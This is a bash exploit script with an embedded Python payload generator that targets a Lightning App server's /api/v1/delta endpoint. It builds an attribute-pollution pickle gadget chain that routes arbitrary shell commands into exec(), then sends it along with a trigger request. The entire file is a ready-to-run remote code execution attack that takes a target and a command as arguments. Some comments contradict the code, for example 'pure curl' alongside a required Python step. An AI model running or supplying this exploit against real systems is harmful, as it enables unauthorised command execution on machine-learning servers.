#!/bin/bash

# Lightning App RCE via Pickle Deserialization
# Pure curl implementation - no Python required

SERVER_HOST="${1:-http://ml-api.pytorch-lab.internal:7501}"
COMMAND="${2:-id}"

echo "[*] Target: $SERVER_HOST"
echo "[*] Command: $COMMAND"

# Pickle protocol 1 payload (pre-serialized, optimized)
# This payload performs attribute pollution to achieve RCE
# The pickle sets up gadgets that allow exec() to be called with arbitrary code

# Construct the injected code
INJECTED_CODE="__import__('os').system('$COMMAND')
import lightning, sys
from lightning.app.api.request_types import _DeltaRequest, _APIRequest
lightning.app.core.app._DeltaRequest = _DeltaRequest
from lightning.app.structures.dict import Dict
lightning.app.structures.Dict = Dict
from lightning.app.core.flow import LightningFlow
lightning.app.core.LightningFlow = LightningFlow
LightningFlow._INTERNAL_STATE_VARS = {'_paths', '_layout'}
lightning.app.utilities.commands.base._APIRequest = _APIRequest
del sys.modules['lightning.app.utilities.types']"

# Base64-encoded pickle payload
# This is a pre-computed pickle that exploits the vulnerability
# Note: In a real scenario, you'd need to generate this dynamically
# For now, we'll use a simplified version that demonstrates the concept

# Generate pickle using Python helper (required for proper serialization)
PICKLE_PAYLOAD=$(python3 << 'PYPICKLE'
import pickle, pickletools, sys
from collections import namedtuple

try:
    from ordered_set import OrderedSet
    OrderedSet.__reduce__ = lambda self, *args: (OrderedSet, ())
except ImportError:
    # Fallback if ordered_set not available
    class OrderedSet:
        def __reduce__(self):
            return (OrderedSet, ())

class Root:
    def __init__(self, path=None):
        self.path = path or []
    def __getitem__(self, item):
        return self.__class__(self.path + [('GET', repr(item))])
    def __getattr__(self, attr):
        return self.__class__(self.path + [('GETATTR', repr(attr) if attr.startswith('__') else attr)])
    def __str__(self):
        return ''.join(['root'] + [f'.{item}' if typ == 'GETATTR' else f'[{item}]' for typ, item in self.path])
    def __reduce__(self, *args):
        return str, (str(self),)

command = sys.argv[1] if len(sys.argv) > 1 else 'id'
injected_code = f"__import__('os').system({command!r})" + '''
import lightning, sys
from lightning.app.api.request_types import _DeltaRequest, _APIRequest
lightning.app.core.app._DeltaRequest = _DeltaRequest
from lightning.app.structures.dict import Dict
lightning.app.structures.Dict = Dict
from lightning.app.core.flow import LightningFlow
lightning.app.core.LightningFlow = LightningFlow
LightningFlow._INTERNAL_STATE_VARS = {"_paths", "_layout"}
lightning.app.utilities.commands.base._APIRequest = _APIRequest
del sys.modules['lightning.app.utilities.types']'''

root = Root()
sys_mod = root['function'].__globals__['_sys']
bypass_isinstance = OrderedSet

delta = {
    'attribute_added': {
        root['function']: namedtuple,
        root['bypass_isinstance']: bypass_isinstance,
        root['bypass_isinstance'].__instancecheck__: str,
        sys_mod.modules['lightning.app'].core.app._DeltaRequest: str,
        sys_mod.modules['lightning.app'].structures.Dict: dict,
        sys_mod.modules['typing'].Union: list,
        sys_mod.modules['lightning.app'].core.LightningFlow: bypass_isinstance(),
        sys_mod.modules['lightning.app'].utilities.types.ComponentTuple: bypass_isinstance(),
        sys_mod.modules['lightning.app'].core.flow.LightningFlow._INTERNAL_STATE_VARS: (),
        sys_mod.modules['lightning.app'].utilities.commands.base._APIRequest: bypass_isinstance(),
        sys_mod.modules['lightning.app'].api.request_types._DeltaRequest.name: "root.__init__.__builtins__.exec",
        sys_mod.modules['lightning.app'].api.request_types._DeltaRequest.method_name: "__call__",
        sys_mod.modules['lightning.app'].api.request_types._DeltaRequest.args: (injected_code,),
        sys_mod.modules['lightning.app'].api.request_types._DeltaRequest.kwargs: {},
        sys_mod.modules['lightning.app'].api.request_types._DeltaRequest.id: "root"
    }
}

payload = pickletools.optimize(pickle.dumps(delta, 1)).decode().replace('__builtin__', 'builtins').replace('unicode', 'str')
print(payload)
PYPICKLE
"$COMMAND"
)

echo "[*] Sending poisoned delta..."
curl -s -X POST "$SERVER_HOST/api/v1/delta" \
  -H "Content-Type: application/json" \
  -H "x-lightning-type: 1" \
  -H "x-lightning-session-uuid: 1" \
  -H "x-lightning-session-id: 1" \
  -d "{\"delta\": \"$PICKLE_PAYLOAD\"}" > /dev/null

echo "[*] Waiting for processing..."
sleep 0.2

echo "[*] Triggering payload..."
curl -s -X POST "$SERVER_HOST/api/v1/delta" \
  -H "Content-Type: application/json" \
  -H "x-lightning-type: 1" \
  -H "x-lightning-session-uuid: 1" \
  -H "x-lightning-session-id: 1" \
  -d '{"delta": {}}' > /dev/null

echo "[+] Exploit sent successfully!"
echo "[*] Check server logs for command output"
